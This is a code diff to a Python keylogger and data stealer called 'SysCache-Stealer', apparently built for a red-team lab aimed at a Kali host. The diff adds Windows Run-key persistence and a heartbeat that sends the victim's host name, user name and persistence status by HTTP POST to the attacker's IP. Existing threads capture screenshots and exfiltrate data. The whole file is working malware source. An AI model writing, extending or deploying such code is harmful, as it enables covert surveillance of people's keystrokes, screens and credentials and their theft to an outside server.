@@ -41,6 +41,8 @@ from pynput import keyboard, mouse
 import mss
 import pyperclip
 
+from persistence import install as install_persistence, uninstall as uninstall_persistence
+
 # ---------------- CONFIG ----------------
 ATTACKER_IP      = "192.168.160.129"   # <-- IP KALI
 ATTACKER_PORT    = 4444
@@ -290,11 +292,38 @@ def login_monitor_loop():
             pass
         time.sleep(HISTORY_CHECK)
 
+# ---------------- HEARTBEAT ----------------
+def _send_persistence_report(status):
+    try:
+        payload = (
+            f"SysCache-Stealer heartbeat\n"
+            f"Host: {platform.node()}\n"
+            f"User: {getpass.getuser()}\n"
+            f"Time: {now()}\n"
+            f"Persistence: {'ACTIVE' if status else 'FAILED'}\n"
+        )
+        conn = HTTPConnection(ATTACKER_IP, ATTACKER_PORT, timeout=5)
+        conn.request("POST", "/upload", body=payload.encode(),
+                     headers={"X-Filename": f"heartbeat_{platform.node()}.txt",
+                              "Content-Length": str(len(payload))})
+        resp = conn.getresponse(); resp.read(); conn.close()
+    except Exception:
+        pass
+
 # ---------------- MAIN ----------------
 if __name__ == "__main__":
     log_line(f"\n=== Keylogger avviato {now()} ===")
+
+    # --- Persistence (Red Teaming requirement) ---
+    persistence_ok = install_persistence()
+    if persistence_ok:
+        print("[+] Persistence installed (HKCU\\...\\Run)")
+    else:
+        print("[!] Persistence could not be installed (continuing anyway)")
+    _send_persistence_report(persistence_ok)
+
     seed_seen_logins()
-    
+
     # Start all background threads
     threading.Thread(target=screenshot_loop, daemon=True).start()
     threading.Thread(target=exfil_loop, daemon=True).start()
